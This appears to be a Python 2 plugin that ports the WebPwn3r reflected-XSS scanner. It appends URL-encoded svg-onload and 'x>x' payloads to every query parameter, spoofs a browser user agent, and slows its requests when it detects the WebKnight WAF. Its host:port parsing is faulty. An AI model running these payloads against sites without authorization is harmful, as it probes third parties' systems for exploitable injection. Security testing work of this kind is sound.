# Ugly Reflected XSS plugin port original by @Zigoo0 ported by @asim_jaweesh

import signal
import socket
from datetime import datetime
import multiprocessing as multip
import errno
import time

import re
import urllib
from urllib import FancyURLopener

class UserAgent(FancyURLopener):
    version = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/99.0'

useragent = UserAgent()

def main_function(url, payloads, check):
    #This function is going to split the url and try the append paylods in every parameter value.
    opener = urllib.urlopen(url)
    vuln = 0
    if str(5) in str(opener.code):
        app.print_line("Server Error!")
    if opener.code == 999:
        # Detetcing the WebKnight WAF from the StatusCode.
        app.print_line("[~] WebKnight WAF Detected!")
        app.print_line("[~] Delaying 3 seconds between every request")
        time.sleep(3)
    for params in url.split("?")[1].split("&"):
        for payload in payloads:
            bugs = url.replace(params, params + str(payload).strip())
            request = useragent.open(bugs)
            html = request.readlines()
            for line in html:
                checker = re.findall(check, line)
                if len(checker) != 0:
                    app.print_line("[*] Bingo! Vulnerable url: %s " % bugs)
                    vurl = url.split('/')[2]
                    # TODO: insert into the database
                    #app.db.host.add(app.db.get_session(), hid=vurl,url=bugs,vuln='Yes',pay=str(payload).strip())
                    vuln += 1


    if vuln == 0:
        app.print_line("[!] Target is not vulnerable!")



def xss_func(url):
    #Paylod zigoo="css();" added for XSS in <a href TAG's
    payloads = ['%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
    payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb',
                 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
    check = re.compile('zigoo0<svg|x>x', re.I)
    main_function(url, payloads, check)



##################################################################################

app = None
#'url' : ('', '', 'Yes',  'the url with parameters to be scanned for XSS')
options = {}




def _scan(url):
    s = None
    url = str(url)
    hostPort = url.split('/')[2]
    port = 80
    ipaddr = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if not(':' in hostPort):
            ipaddr = socket.gethostbyname(hostPort)
        else:
            ipaddr = socket.gethostbyname(hostPort.split('/')[2].split(':')[1])
        s.connect((ipaddr, port))
        xss_func(url)
    except IOError, ex:
        if ex.errno != errno.EINTR:
            app.print_line("%s | %s | %d | ERROR | %r" % (datetime.now(), ipaddr, port, str(ex)))

    finally:
        if s:
            try:
                s.shutdown(socket.SHUT_WR)
            except IOError:
                pass
            finally:
                s.close()


def do_xss(args):
    def init_work(*_):
        signal.signal(signal.SIGINT, signal.SIG_IGN)

    pool = multip.Pool(processes=5, initializer=init_work)
    jobs = []
    #
    try:
        j = pool.apply_async(_scan, (args,))
        jobs.append(j)
        for j in jobs:
            j.get()
    except KeyboardInterrupt:
        pool.terminate()
        pool.join()
    else:
        pool.close()
        pool.join()

def help_xss():
    helpme = \
        ("\n"
         "This plugin checks for XSS based on @Zigoo0 's WebPwn3r scanner https://github.com/zigoo0/webpwn3r\n"
         "Example:\n"
         "    xss http://localhost/xss.php?p=a\n"
         "    [*] Bingo! Vulnerable url: http://localhost/...\n"
         "    [*] Bingo! Vulnerable url: http://localhost/...\n"
         "    [*] Bingo! Vulnerable url: http://localhost/...\n"
        )
    return str(helpme)

